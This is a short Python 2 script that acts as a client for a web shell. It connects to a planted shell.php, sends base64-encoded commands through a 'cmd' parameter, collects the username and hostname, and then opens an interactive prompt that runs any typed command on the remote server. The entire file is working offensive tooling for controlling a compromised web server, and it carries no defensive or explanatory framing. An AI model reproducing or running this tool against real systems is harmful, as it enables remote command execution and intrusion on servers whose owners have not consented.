#!/usr/bin/python
 
import random
import requests
import string
import base64

def main():
    session = requests.Session()
    session.trust_env = False
     
    ip = "127.0.0.1"
    port = "8081"
    filename = "shell.php"
    
    print filename
    param = "cmd"
    
    url = "http://" + ip + ":" + port + "/" + filename
    
    print "\n[*] Connecting to web shell:"
    print "    " + url
    
    print "\n[*] Obtaining username."
    
    r = session.get(url, params={param: base64.b64encode("whoami")})
    username = base64.b64decode(r.text)
    
    if "\\" in username:
        username = username.split("\\",1)[1]
        
    print "\n[*] Obtaining hostname."
    
    r = session.get(url, params={param: base64.b64encode("hostname")})
    hostname = base64.b64decode(r.text)
    
    print "\n[+] Returning prompt!\n\n"
    
    try:
        while True:
            cmd = raw_input(username + "@" + hostname + ":~$ ")
            if cmd == "exit":
                print "\n\n[-] EXITING\n"
                return
            else:
                encoded = base64.b64encode(cmd)
                r = session.get(url, params={param: encoded})
                print base64.b64decode(r.text) + "\n"
    except KeyboardInterrupt:
        print "\n\n\n[-] EXITING\n"
        return
    
if __name__ == "__main__":
    main()